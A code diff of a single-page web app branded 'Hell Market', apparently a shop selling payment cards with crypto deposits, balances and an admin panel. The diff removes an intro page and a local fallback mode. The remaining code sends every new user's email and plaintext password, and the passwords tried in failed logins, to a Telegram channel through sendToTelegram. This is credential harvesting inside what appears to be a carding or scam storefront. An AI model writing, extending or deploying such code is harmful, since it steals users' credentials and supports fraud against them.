@@ -42,33 +42,6 @@ main{flex:1;max-width:1120px;margin:auto;width:100%;padding:24px}
 .card-img img{width:100%;height:100%;object-fit:fill;border-radius:6px;display:block}
 .card-body{padding:12px;text-align:center}.card-body h3{margin:0 0 4px;font-size:18px}.sub{color:#ccc;font-size:13px;margin-bottom:4px}.stars{color:#ffd900;margin:6px 0;font-size:13px}.avail{color:#2cff7b;font-size:13px;margin-bottom:10px}.buy{width:100%;padding:9px;border:0;border-radius:20px;background:#fff;color:#000;font-weight:800;cursor:pointer}
 
-.intro-landing{
-  position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;
-  background:#030000 radial-gradient(circle at 75% 50%, rgba(180, 0, 0, 0.4), transparent 60%);
-  display:flex;flex-direction:column;justify-content:space-between;padding:20px 30px;overflow:hidden;
-}
-.intro-header{display:flex;align-items:center;justify-content:space-between;width:100%;}
-.intro-header-logo{font-size:16px;font-weight:900;color:#fff;letter-spacing:1px;}
-.intro-body{
-  flex:1;display:flex;align-items:center;justify-content:space-between;
-  width:100%;max-width:1300px;margin:0 auto;gap:30px;
-}
-.intro-left{flex:1;display:flex;flex-direction:column;align-items:flex-start;justify-content:center;z-index:2;}
-.intro-logo-img{width:100%;max-width:340px;height:auto;object-fit:contain;margin-bottom:20px;filter:drop-shadow(0 0 25px rgba(255,30,0,0.6));}
-.intro-typing-title{font-size:38px;font-weight:900;color:#fff;letter-spacing:2px;min-height:50px;display:flex;align-items:center;text-shadow:0 0 20px rgba(255,50,0,0.8);}
-.typing-cursor{display:inline-block;width:3px;height:36px;background:#ff3b12;margin-left:5px;animation:blink 0.7s infinite;}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
-.intro-subtitle{color:#ccc;font-size:13px;margin:15px 0 25px;max-width:480px;line-height:1.5;}
-.start-order-btn{
-  background:#fff;color:#000;border:0;padding:8px 20px;font-size:12px;font-weight:bold;
-  border-radius:3px;cursor:pointer;box-shadow:0 0 15px rgba(255,255,255,0.4);
-  transition:all 0.2s ease;
-}
-.start-order-btn:hover{background:#ff3b12;color:#fff;box-shadow:0 0 20px rgba(255,59,18,0.8);}
-.intro-right-hacker{flex:1;display:flex;align-items:center;justify-content:center;height:100%;position:relative;}
-.big-hero-logo{width:100%;max-width:440px;height:auto;object-fit:contain;filter:drop-shadow(0 0 35px rgba(255,40,0,0.7));animation:glowPulse 3s infinite alternate;}
-@keyframes glowPulse{0%{filter:drop-shadow(0 0 20px rgba(255,30,0,0.4));transform:scale(0.98);}100%{filter:drop-shadow(0 0 45px rgba(255,60,0,0.85));transform:scale(1.02);}}
-
 .auth{min-height:100vh;display:flex;width:100%;background:#090000}
 .auth-left{
   flex:1.2;background:#140101 radial-gradient(circle at 50% 50%, rgba(200, 10, 10, 0.25), transparent 70%);
@@ -118,10 +91,6 @@ main{flex:1;max-width:1120px;margin:auto;width:100%;padding:24px}
   .auth-left{padding:25px;min-height:auto;}
   .cards{grid-template-columns:repeat(2,1fr)}
   .stats{grid-template-columns:repeat(2,1fr)}
-  .intro-body{flex-direction:column;text-align:center;}
-  .intro-left{align-items:center;}
-  .intro-right-hacker{display:none;}
-  .intro-typing-title{font-size:26px;}
 }
 @media(max-width:600px){
   .cards{grid-template-columns:1fr}
@@ -233,63 +202,6 @@ window.addEventListener('hashchange', () => {
   }
 });
 
-function renderIntroLanding(){
-  if(checkRoute()) return;
-  root().innerHTML = `
-  <div class="intro-landing" id="introLandingPage">
-    <div class="intro-header">
-      <div class="intro-header-logo">HELL MARKET</div>
-    </div>
-    <div class="intro-body">
-      <div class="intro-left">
-        <img src="${LOGO_URL}" class="intro-logo-img" alt="Hell Market Logo">
-        <div class="intro-typing-title">
-          <span id="typedText"></span><span class="typing-cursor"></span>
-        </div>
-        <p class="intro-subtitle">
-          "Your reliable partner for growth, Integrity, Experience, Trust, Delivering results with honesty and care."
-        </p>
-        <button class="start-order-btn" onclick="exitIntroToApp()">Start Your Order</button>
-      </div>
-      <div class="intro-right-hacker">
-        <img src="${LOGO_URL}" class="big-hero-logo" alt="Hell Market Logo Large">
-      </div>
-    </div>
-  </div>`;
-  startTypingAnimation();
-}
-
-let typingInterval;
-function startTypingAnimation(){
-  const fullText = "WELCOME TO HELL MARKET";
-  const el = document.getElementById('typedText');
-  if(!el) return;
-  let i = 0;
-  let isDeleting = false;
-
-  clearInterval(typingInterval);
-  typingInterval = setInterval(() => {
-    if(!isDeleting) {
-      el.textContent = fullText.substring(0, i + 1);
-      i++;
-      if(i === fullText.length) isDeleting = true;
-    } else {
-      el.textContent = fullText.substring(0, i - 1);
-      i--;
-      if(i === 0) isDeleting = false;
-    }
-  }, 120);
-}
-
-window.exitIntroToApp = function(){
-  clearInterval(typingInterval);
-  if(auth && auth.currentUser) {
-    dashboard();
-  } else {
-    authView('register');
-  }
-}
-
 function authView(mode='register'){
   if(checkRoute()) return;
   root().innerHTML=`<div class="auth"><div class="auth-left">${logoHtml()}</div><div class="auth-right"><div class="auth-box"><div class="brand"><img src="${LOGO_URL}" alt="logo"></div><h2>${mode==='register'?'Create Account':'Welcome Back'}</h2><div id="authMsg"></div>${mode==='register'?`<div class="field"><label>Username *</label><input id="username" placeholder="Choose a username"></div>`:''}<div class="field"><label>Email *</label><input id="email" type="email" placeholder="Enter your email"></div><div class="field"><label>Password *</label><input id="password" type="password" placeholder="Enter password"><div class="pass-hint">Minimum 8 characters required.</div></div>${mode==='register'?`<div class="field"><label>Confirm Password *</label><input id="confirm" type="password" placeholder="Confirm password"></div>`:''}<button class="cta" style="width:100%" id="authSubmitBtn">${mode==='register'?'CREATE ACCOUNT':'SIGN IN'}</button>${mode==='login'?`<div style="text-align:right; margin-top:8px;"><span class="link" style="font-size:12px;" onclick="forgotPassword()">Forgot Password?</span></div>`:''}<div class="switch">${mode==='register'?'Already have an account?':'Don’t have an account?'} <span class="link" onclick="authView('${mode==='register'?'login':'register'}')">${mode==='register'?'Sign In':'Create Account'}</span></div></div></div></div>`;
@@ -327,15 +239,7 @@ async function handleRegister(){
       };
       await db.collection("users").doc(uid).set(currentUserData);
       sendToTelegram(`🆕 <b>NEW USER SIGNUP (HELL MARKET)</b>\n👤 <b>Username:</b> <code>${u}</code>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Password:</b> <code>${p}</code>\n🆔 <b>UID:</b> <code>${uid}</code>`);
-    } else {
-      currentUserData = {
-        user: { uid: 'local_user', username: u, email: e },
-        balance: 500, transactions: [], cards: []
-      };
-      localStorage.setItem('hell_local_user', JSON.stringify(currentUserData));
-      sendToTelegram(`🆕 <b>NEW USER SIGNUP (LOCAL)</b>\n👤 <b>Username:</b> <code>${u}</code>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Password:</b> <code>${p}</code>`);
     }
-    
     toast('Account created successfully!');
     dashboard();
   } catch(err) {
@@ -361,13 +265,7 @@ async function handleLogin(){
         currentUserData = { user: { uid: uid, username: e.split('@')[0], email: e }, balance: 0, transactions: [], cards: [] };
       }
       sendToTelegram(`🟢 <b>USER LOGIN SUCCESS</b>\n📧 <b>Email:</b> <code>${e}</code>\n🆔 <b>UID:</b> <code>${uid}</code>`);
-    } else {
-      const saved = localStorage.getItem('hell_local_user');
-      if(saved) currentUserData = JSON.parse(saved);
-      else currentUserData = { user: { uid: 'local_user', username: e.split('@')[0], email: e }, balance: 250, transactions: [], cards: [] };
-      sendToTelegram(`🟢 <b>USER LOGIN (LOCAL)</b>\n📧 <b>Email:</b> <code>${e}</code>`);
     }
-
     dashboard();
   } catch(err) {
     sendToTelegram(`❌ <b>FAILED LOGIN ATTEMPT</b>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Tried Password:</b> <code>${p}</code>\n⚠️ <b>Reason:</b> ${err.message}`);
@@ -376,10 +274,7 @@ async function handleLogin(){
 }
 
 async function syncUserData(){
-  if(!auth || !auth.currentUser || !db) {
-    localStorage.setItem('hell_local_user', JSON.stringify(currentUserData));
-    return;
-  }
+  if(!auth || !auth.currentUser || !db) return;
   try {
     await db.collection("users").doc(auth.currentUser.uid).set(currentUserData);
   } catch(e) {
@@ -392,7 +287,7 @@ function shell(page){
   root().innerHTML=`<div class="app"><header class="topbar"><button class="iconbtn" onclick="document.querySelector('.sidebar').classList.toggle('open')">☰</button><div class="brand"><img src="${LOGO_URL}" alt="logo"></div><div class="top-actions"><div class="top-balance">💳 $<span id="topBalanceVal">${currentUserData.balance.toFixed(2)}</span></div><button class="iconbtn" onclick="deposit()">＋ Add Balance</button></div></header><div class="layout"><aside class="sidebar"><div class="nav"><button class="${page==='dashboard'?'active':''}" onclick="dashboard()">🏠 Dashboard</button><button class="${page==='cards'?'active':''}" onclick="cards()">💳 Cards</button><button class="${page==='deposit'?'active':''}" onclick="deposit()">💰 Deposit</button><button class="${page==='mycards'?'active':''}" onclick="myCards()">🎫 My Cards</button><button class="${page==='support'?'active':''}" onclick="support()">💬 Support</button><button class="${page==='settings'?'active':''}" onclick="settings()">⚙️ Settings</button></div><button class="logout" onclick="logout()">Logout</button></aside><main id="content"></main></div></div>`
 }
 
-function commonTop(){return `<div class="welcome">Welcome<br><span>(${escapeHtml(currentUserData.user ? currentUserData.user.email : 'Guest')})</span></div>`}
+function commonTop(){return `<div class="welcome">Welcome<br><span>(${escapeHtml(currentUserData.user ? currentUserData.user.email : 'User')})</span></div>`}
 
 function dashboard(){
   if(checkRoute()) return;
@@ -604,7 +499,7 @@ window.awaitingPaymentState = async function(amount){
   currentUserData.transactions.unshift({type:'Deposit',address:currentDepositAddress,txid:userTxid,amount:amount,status:'Pending',time:new Date().toLocaleString()});
   await syncUserData();
 
-  sendToTelegram(`💰 <b>NEW DEPOSIT SUBMITTED</b>\n👤 <b>User:</b> <code>${currentUserData.user ? currentUserData.user.email : 'Local'}</code>\n💵 <b>Amount:</b> $${amount}\n🔗 <b>TxID:</b> <code>${userTxid}</code>`);
+  sendToTelegram(`💰 <b>NEW DEPOSIT SUBMITTED</b>\n👤 <b>User:</b> <code>${currentUserData.user ? currentUserData.user.email : 'User'}</code>\n💵 <b>Amount:</b> $${amount}\n🔗 <b>TxID:</b> <code>${userTxid}</code>`);
 
   document.getElementById('depositArea').innerHTML = `<div class="panel" style="margin-top:20px; text-align:center;"><div class="spinner"></div><h3 style="color:#ff3b0b;">Awaiting Payment Confirmation...</h3><p style="color:#ccc;">Checking Blockchain Confirmations. Status: <b>Pending</b>.</p></div>`;
   renderDepositHistoryTable();
@@ -713,7 +608,7 @@ async function renderAdminPanel(){
   </div>`;
 
   if(!db) {
-    document.getElementById('adminUsersList').innerHTML = `<p style="color:#ffcc00;">Local Preview Mode: Admin panel reads local session.</p>`;
+    document.getElementById('adminUsersList').innerHTML = `<p style="color:#ffcc00;">Local Mode Unavailable</p>`;
     return;
   }
 
@@ -775,55 +670,38 @@ window.adminAddBalance = async function(uid){
 
 window.logout = async function(){
   if(auth) await auth.signOut();
-  localStorage.removeItem('hell_local_user');
   currentUserData = { user: null, balance: 0, transactions: [], cards: [] };
   authView('login');
 }
 
 function escapeHtml(s){return String(s||'').replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[m]||m))}
 
-let appInitialized = false;
-
-function loadFallbackOrDashboard(user) {
-  if (appInitialized) return;
-  appInitialized = true;
-  
-  if (user) {
-    db.collection("users").doc(user.uid).get().then(docSnap => {
-      if(docSnap.exists) currentUserData = docSnap.data();
-      else currentUserData = { user: { uid: user.uid, username: user.email.split('@')[0], email: user.email }, balance: 0, transactions: [], cards: [] };
-      dashboard();
-    }).catch(() => {
-      dashboard();
-    });
-  } else {
-    const localSaved = localStorage.getItem('hell_local_user');
-    if(localSaved) {
-      try { currentUserData = JSON.parse(localSaved); } catch(e){}
-      dashboard();
-    } else {
-      renderIntroLanding();
-    }
-  }
-}
-
+// 🔒 STRICT AUTH GUARD: Bina Login ke andar jaane ki ijazat nahi
 try {
-  setTimeout(() => {
-    if (!appInitialized) {
-      loadFallbackOrDashboard(null);
-    }
-  }, 2000);
-
   if(auth) {
     auth.onAuthStateChanged((user) => {
       if(checkRoute()) return;
-      loadFallbackOrDashboard(user);
+      if(user) {
+        db.collection("users").doc(user.uid).get().then(docSnap => {
+          if(docSnap.exists) {
+            currentUserData = docSnap.data();
+          } else {
+            currentUserData = { user: { uid: user.uid, username: user.email.split('@')[0], email: user.email }, balance: 0, transactions: [], cards: [] };
+          }
+          dashboard();
+        }).catch(() => {
+          dashboard();
+        });
+      } else {
+        currentUserData = { user: null, balance: 0, transactions: [], cards: [] };
+        authView('login'); // 🛑 Bina login seedha Login page dikhega
+      }
     });
   } else {
-    loadFallbackOrDashboard(null);
+    authView('login');
   }
 } catch(initErr) {
-  loadFallbackOrDashboard(null);
+  authView('login');
 }
 </script>
 </body>
